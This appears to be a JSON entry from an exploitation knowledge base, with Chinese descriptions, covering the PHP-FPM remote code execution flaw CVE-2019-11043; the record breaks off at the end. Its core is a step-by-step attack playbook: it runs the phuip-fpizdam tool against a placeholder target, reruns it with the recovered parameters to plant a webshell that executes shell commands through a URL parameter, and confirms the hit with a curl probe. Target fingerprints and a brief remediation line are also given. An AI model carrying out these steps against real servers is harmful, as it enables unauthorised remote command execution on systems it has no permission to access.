{
  "vuln_id": "php_fpm_cve2019_11043",
  "description": "PHP-FPM在特定配置下存在缓冲区溢出漏洞，可导致远程代码执行",
  "category": "config_exploit",
  "cves": [
    "CVE-2019-11043"
  ],
  "match_keywords": [
    "php-fpm",
    "cve-2019-11043",
    "phuip-fpizdam",
    "nginx",
    "fastcgi",
    "real world ctf 2019"
  ],
  "fingerprint_keywords": [
    "nginx",
    "php-fpm",
    "fastcgi",
    "location ~ [^/]\\.php(/|$)"
  ],
  "affected_versions": "PHP 7.1.x < 7.1.33, 7.2.x < 7.2.24, 7.3.x < 7.3.11",
  "default_port": 8080,
  "common_endpoints": [
    "/index.php",
    "/"
  ],
  "detection_method": "使用工具phuip-fpizdam检测，发送特定请求探测QSL参数，若返回502状态码则可能漏洞存在。具体：访问目标URL，观察响应状态码，工具会尝试不同qsl值，当出现502时标记为候选。",
  "exploit_steps": [
    {
      "step": 1,
      "description": "使用phuip-fpizdam工具检测漏洞并获取攻击参数",
      "command": "go run . \"http://{TARGET}/index.php\"",
      "expected_result": "输出类似：'The target is probably vulnerable. Possible QSLs: [1785 1790 1795]' 和 'Attack params found: --qsl 1790 --pisos 152 --skip-detect'",
      "notes": "需要安装Go环境，工具从https://github.com/neex/phuip-fpizdam获取。如果命令不成功，尝试多次请求以命中受影响进程。"
    },
    {
      "step": 2,
      "description": "利用获取的参数执行攻击，注入webshell",
      "command": "go run . \"http://{TARGET}/index.php\" --qsl 1790 --pisos 152 --skip-detect",
      "expected_result": "输出：'Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs'",
      "notes": "参数qsl和pisos可能因目标而异，需根据第一步输出调整。漏洞只影响部分PHP-FPM子进程，可能需要多次尝试。"
    }
  ],
  "verification_command": "curl -s -D - -o /dev/null \"http://{TARGET}/index.php/%0a\" --max-time 10",
  "verification_success_sign": "HTTP/1.1 502",
  "requires_callback": false,
  "callback_note": "无需回连，直接通过URL参数执行命令并返回结果。",
  "remediation": "升级PHP到安全版本（7.1.33、7.2.24、7.3.11或更高），检查并修复Nginx配置，避免使用易受攻击的location规则。",
  "tags": [
    "rce",
    "php",
    "nginx",
    "buffer_overflow",
    "fastcgi"
  ],
  "search_text": "PHP-FPM在特定配置下存在缓冲区溢出漏洞，可导致远程代码执行 config_exploit CVE-2019-11043 php-fpm cve-2019-11043 phuip-fpizdam nginx fastcgi real world ctf 2019 nginx php-fpm fastcgi location ~ [^/]\\.php(/|$) 使用工具phuip-fpizdam检测，发送特定请求探测QSL参数，若返回502状态码则可能漏洞存在。具体：访问目标URL，观察响应状态码，工具会尝试不同qsl值，当出现502时标记为候选。 PHP 7.1.x < 7.1.33, 7.2.x < 7.2.24, 7.3.x < 7.3.11 rce php nginx buffer_overflow fastcgi 使用phuip-fpizdam工具检测漏洞并获取攻击参数 利用获取的参数执行攻击，注入webshell",
